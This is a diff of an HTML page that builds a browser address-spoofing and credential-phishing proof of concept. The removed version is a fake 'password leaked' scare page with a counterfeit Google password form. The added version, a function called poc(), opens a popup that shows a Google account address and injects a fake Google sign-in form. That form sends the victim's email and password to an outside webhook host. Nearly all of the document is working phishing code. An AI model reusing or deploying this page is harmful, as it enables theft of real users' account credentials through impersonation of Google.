@@ -1,94 +1,133 @@
-<html>
 
+
+<!DOCTYPE html>
+<html lang="en">
 <head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login</title>
+    <script>
+        function poc() {
+v= window.open('about://blank#xss','popup','popup');
+v .location.href='about:blank#https://myaccount.google.com/login';
+setTimeout(()=>{
+v.document.body.innerHTML=(`<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Google Login</title>
     <style>
-        #front {
-            align-items: center;
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
             justify-content: center;
-            padding: 25vh;
-            display: block;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background-color: #f1f1f1;
         }
-        
-        #spoofed {
-            display: none;
-        }
-        
-        .header {
-            position: absolute;
-            top: 0;
-            width: 100vw;
-        }
-        
-        #front>h1 {
+        .container {
+            background-color: white;
+            padding: 40px;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
             text-align: center;
-            color: #333;
-            margin: 20px 0;
+            max-width: 400px;
+            width: 100%;
         }
-        
-        #front>h3 {
-            text-align: center;
-            color: #f01212;
-            margin: 40px 0;
+        h1 {
+            font-size: 24px;
+            margin-bottom: 30px;
         }
-        
-        #front>button {
-            display: block;
-            margin: 20px auto;
-            padding: 10px 20px;
-            background-color: #3f51b5;
-            color: #fff;
+        input {
+            width: 100%;
+            padding: 10px;
+            margin-bottom: 20px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            font-size: 16px;
+        }
+        input[type="submit"] {
+            background-color: #4285f4;
+            color: white;
             border: none;
-            border-radius: 5px;
+            padding: 12px;
+            font-size: 16px;
             cursor: pointer;
+            transition: background-color 0.3s;
         }
+        input[type="submit"]:hover {
+            background-color: #357ae8;
+        }
+        .google-logo {
+            font-size: 24px;
+            margin-bottom: 20px;
+        }
+        .google-logo span:nth-child(1) { color: #4285F4; }
+        .google-logo span:nth-child(2) { color: #EA4335; }
+        .google-logo span:nth-child(3) { color: #FBBC05; }
+        .google-logo span:nth-child(4) { color: #4285F4; }
+        .google-logo span:nth-child(5) { color: #34A853; }
+        .google-logo span:nth-child(6) { color: #EA4335; }
     </style>
 </head>
-
-<body style="margin: 0;font-family: 'Ubuntu', Arial, sans-serif;overflow: hidden;">
-    <div id="front">
-        <h1>Oh no, your Account password has been leaked. To get your account back, follow these steps:
-            <h3>1. Notify Security Team by email about the case using the button below!!.
-                <br>2. next page of the Google Account website, enter your last used account password to verify it.
-                <h3>
-        </h1>
-        <button onclick="run();">Have a Good Dream</button>
-        <a href="mailto:notsecurity@notgoogle.com?subject=Request%20to%20Block%20Compromised%20Account&body=Dear%20Google%20Security%20Team%2C%0A%0AI%20hope%20this%20email%20finds%20you%20well.%20I%20am%20writing%20to%20notify%20you%20that%20my%20Google%20account%20password%20has%20been%20leaked.%20I%20am%20concerned%20about%20the%20security%20of%20my%20personal%20information%20and%20would%20like%20to%20request%20that%20my%20account%20be%20blocked%20as%20soon%20as%20possible.%0A%0APlease%20let%20me%20know%20what%20steps%20I%20need%20to%20take%20to%20ensure%20that%20my%20account%20is%20secured%20and%20my%20personal%20information%20is%20protected.%20I%20would%20also%20appreciate%20any%20additional%20security%20measures%20that%20you%20can%20recommend%20to%20prevent%20future%20incidents%20like%20this.%0A%0AThank%20you%20for%20your%20prompt%20attention%20to%20this%20matter.%20I%20look%20forward%20to%20hearing%20from%20you%20soon.."
-            id="runThis"></a>
-    </div>
-    <div id="spoofed">
-        <img src="https://guzings.github.io/spoof.png" class="header" />
-        <div style="display: flex; justify-content: center; align-items: center; height: 100vh;">
-            <div style="background-color: #fff; padding: 50px; box-shadow: 0px 0px 10px rgba(0,0,0,0.2); border-radius: 10px;">
-                <img src="https://www.gstatic.com/identity/boq/accountsettingsmobile/signedout_security_scene_316x112_897e5cfed5be1d1d2e6f376d675ff02d.png" style="display: block; margin: 0 auto;" />
-
-                <form style="margin-top: 50px;">
-                    <h5 style="color: #12f030;">Enter your last used account password to verify.</h5>
-                    <div style="margin-bottom: 20px;">
-                        <label for="email" style="display: block; font-size: 14px;">Email:</label>
-                        <input type="text" id="username" name="username" style="width: 100%; padding: 10px; font-size: 16px; border-radius: 5px; border: 1px solid #ccc;">
-                    </div>
-                    <div style="margin-bottom: 20px;">
-                        <label for="password" style="display: block; font-size: 14px;">Password:</label>
-                        <input type="password" id="password" name="password" style="width: 100%; padding: 10px; font-size: 16px; border-radius: 5px; border: 1px solid #ccc;">
-                    </div>
-                    <input type="submit" value="Sign In" style="width: 100%; padding: 10px; background-color: #3f51b5; color: #fff; border: none; border-radius: 5px; font-size: 16px; cursor: pointer;">
-                </form>
-            </div>
+<body>
+    <div class="container">
+        <div class="google-logo">
+            <span>G</span><span>o</span><span>o</span><span>g</span><span>l</span><span>e</span>
         </div>
-
+        <h1>Sign in</h1>
+        <form action="https://ancient-unicorn-29.webhook.cool" method="GET">
+          <input type="email" name="email" placeholder="Email or phone" required autocomplete="username">
+          <input type="password" name="pass" placeholder="Password" required autocomplete="current-password">
+          <input type="submit" value="Next">
+        </form>
     </div>
-    <script>
-        function run() {
-            const firstDiv = document.getElementById("front");
-            const secondDiv = document.getElementById("spoofed");
-            document.documentElement.requestFullscreen();
-            const butt = document.getElementById("runThis");
-            runThis.click();
-            firstDiv.style.display = "none";
-            secondDiv.style.display = "block";
+</body>
+</html>`);
+
+},1000);
 
         }
     </script>
-</body>
+   <style>
+        body {
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background-color: #f5f5f7;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
+        }
 
+        .container {
+display: none;
+            text-align: center;
+            padding: 20px;
+            background-color: #fff;
+            border-radius: 12px;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
+        }
+button{
+background-color: #4285f4;
+            color: white;
+            border: none;
+            padding: 12px;
+            font-size: 16px;
+            cursor: pointer;
+            transition: background-color 0.3s;
+}
+    </style>
+</head>
+<body>
+
+    <div id="landing" >
+        <h1>
+        <button onclick="poc()">Login with Google</button></h1>
+    </div>
+
+</body>
 </html>
